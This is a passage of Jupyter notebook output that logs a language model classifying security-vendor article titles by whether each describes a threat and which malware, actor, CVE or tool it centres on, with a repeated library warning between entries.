          "text": [
            "Is threat: True\tMain object: Malware: VCURMS\n",
            "Processing 72/427: New Banking Trojan “CHAVECLOAK” Targets Brazil...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: CHAVECLOAK\n",
            "Processing 73/427: FortiGuard Labs Outbreak Alerts Annual Report 2023...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 74/427: Ransomware Roundup – Abyss Locker...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Abyss Locker\n",
            "Processing 75/427: Android/SpyNote Moves to Crypto Currencies...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: SpyNote\n",
            "Processing 76/427: TicTacToe Dropper...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: TicTacToe dropper\n",
            "Processing 77/427: Python Info-stealer Distributed by Malicious Excel...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: script.py\n",
            "Processing 78/427: Ransomware Roundup - Albabat...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Albabat\n",
            "Processing 79/427: Another Phobos Ransomware Variant Launches Attack ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Phobos\n",
            "Processing 80/427: Info Stealing Packages Hidden in PyPI...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: WS\n",
            "  Processed 80/427 articles\n",
            "Processing 81/427: Deceptive Cracked Software Spreads Lumma Variant o...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Lumma Stealer\n",
            "Processing 82/427: Three New Malicious PyPI Packages Deploy CoinMiner...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: modularseven-1.0\n",
            "Processing 83/427: Ransomware Roundup - 8base...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: 8base\n",
            "Processing 84/427: Bandook - A Persistent Threat That Keeps Evolving...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Bandook\n",
            "Processing 85/427: MrAnon Stealer Spreads via Email with Fake Hotel B...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: MrAnon Stealer\n",
            "Processing 86/427: GoTitan Botnet - Ongoing Exploitation on Apache Ac...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-46604\n",
            "Processing 87/427: Konni Campaign Distributed Via Malicious Document...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Konni\n",
            "Processing 88/427: Investigating the New Rhysida Ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Rhysida\n",
            "Processing 89/427: Ransomware Roundup – NoEscape...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: NoEscape\n",
            "Processing 90/427: Threat Predictions for 2024: Chained AI and CaaS O...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "  Processed 90/427 articles\n",
            "Processing 91/427: Ransomware Roundup - Knight...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Knight\n",
            "Processing 92/427: Another InfoStealer Enters the Field, ExelaStealer...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: ExelaStealer\n",
            "Processing 93/427: Ransomware Roundup - Akira...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Akira\n",
            "Processing 94/427: IZ1H9 Campaign Enhances Its Arsenal with Scores of...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2015-1187\n",
            "Processing 95/427: Malicious Packages Hidden in NPM...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: NPM\n",
            "Processing 96/427: Threat Actors Exploit the Tensions Between Azerbai...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: [malware name not specified]\n",
            "Processing 97/427: Ransomware Roundup - Retch and S. H. O....\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Retch\n",
            "Processing 98/427: New MidgeDropper Variant...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: MidgeDropper\n",
            "Processing 99/427: OriginBotnet Spreads via Malicious Word Document...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: OriginBotnet\n",
            "Processing 100/427: New Agent Tesla Variant Being Spread by Crafted Ex...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2017-11882/CVE-2018-0802\n",
            "  Processed 100/427 articles\n",
            "Processing 101/427: Ransomware Roundup - Rhysida...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Rhysida\n",
            "Processing 102/427: Multiple Threats Target Adobe ColdFusion Vulnerabi...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: Adobe ColdFusion deserialization of untrusted data\n",
            "Processing 103/427: Ransomware Roundup – Trash Panda and A New Minor V...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Trash Panda\n",
            "Processing 104/427: FortiGuard AI Detects Malicious Packages Hidden in...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: syssqlitedmodules\n",
            "Processing 105/427: Attackers Distribute Malware via Freeze.rs And SYK...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Freeze.rs\n",
            "Processing 106/427: Key Findings from the 1H 2023 FortiGuard Labs Thre...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 107/427: Ransomware Roundup - DoDo and Proton...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: DoDo\n",
            "Processing 108/427: FortiGuard Labs Discovers Multiple Vulnerabilities...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-24826\n",
            "Processing 109/427: Ransomware Roundup - Cl0p...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Cl0p\n",
            "Processing 110/427: DDoS Botnets Target Zyxel Vulnerability CVE-2023-2...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-28771\n",
            "  Processed 110/427 articles\n",
            "Processing 111/427: FortiGuard Labs Discovers Multiple Vulnerabilities...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-29308\n",
            "Processing 112/427: LokiBot Campaign Targets Microsoft Office Document...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: LokiBot\n",
            "Processing 113/427: Meet LockBit: The Most Prevalent Ransomware in 202...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: LockBit\n",
            "Processing 114/427: Ransomware Roundup - Rancoz...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Rancoz\n",
            "Processing 115/427: New Fast-Developing ThirdEye Infostealer Pries Ope...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: ThirdEye\n",
            "Processing 116/427: Ransomware Roundup - Black Basta...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Black Basta\n",
            "Processing 117/427: Fortinet Reverses Flutter-based Android Malware “F...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Android/Fluhorse\n",
            "Processing 118/427: Condi DDoS Botnet Spreads via TP-Link's CVE-2023-1...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Condi\n",
            "Processing 119/427: Ransomware Roundup - Big Head...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Big Head\n",
            "Processing 120/427: MOVEit Transfer Critical Vulnerability (CVE-2023-3...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-34362\n",
            "  Processed 120/427 articles\n",
            "Processing 121/427: YouTube Pirated Software Videos Deliver Triple Thr...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: [Name of the malware family]\n",
            "Processing 122/427: WINTAPIX: A New Kernel Driver Targeting Countries ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Donut\n",
            "Processing 123/427: More Supply Chain Attacks via Malicious Python Pac...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: BlackCap-Grabber-NoDualHook\n",
            "Processing 124/427: Ransomware Roundup - Maori...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Maori\n",
            "Processing 125/427: RapperBot DDoS Botnet Expands into Cryptojacking...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: RapperBot\n",
            "Processing 126/427: AndoryuBot – New Botnet Campaign Targets Ruckus Wi...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: AndoryuBot\n",
            "Processing 127/427: Clean Rooms, Nuclear Missiles, and SideCopy, Oh My...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: SideCopy\n",
            "Processing 128/427: Ransomware Roundup - UNIZA...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: UNIZA\n",
            "Processing 129/427: EvilExtractor – All-in-One Stealer...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: EvilExtractor\n",
            "Processing 130/427: Ransomware Roundup – Kadavro Vector Ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Kadavro Vector\n",
            "  Processed 130/427 articles\n",
            "Processing 131/427: Deja Vu All Over Again: Tax Scammers at Large...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: note.hta\n",
            "Processing 132/427: Exploring a Recent Microsoft Outlook Vulnerability...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-23397\n",
            "Processing 133/427: Are Internet Macros Dead or Alive?...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: HTML Smuggling\n",
            "Processing 134/427: Malware Disguised as Document from Ukraine's Energ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: INDUSTROYER2\n",
            "Processing 135/427: 3CX Desktop App Compromised (CVE-2023-29059)...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-29059\n",
            "Processing 136/427: Ransomware Roundup – Dark Power and PayMe100USD Ra...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Dark Power\n",
            "Processing 137/427: Moobot Strikes Again - Targeting Cacti And RealTek...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2021-35394\n",
            "Processing 138/427: Supply Chain Attack via New Malicious Python Packa...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: Empyrean\n",
            "Processing 139/427: The Latest Intel on Wipers...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Wiper\n",
            "Processing 140/427: Ransomware Roundup — HardBit 2.0...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: HardBit 2.0\n",
            "  Processed 140/427 articles\n",
            "Processing 141/427: Microsoft OneNote File Being Leveraged by Phishing...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: AsyncRAT\n",
            "Processing 142/427: Reduce, Reuse, Recycle: Bad Actors Practicing the ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Emotet\n",
            "Processing 143/427: Old Cyber Gang Uses New Crypter – ScrubCrypt...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
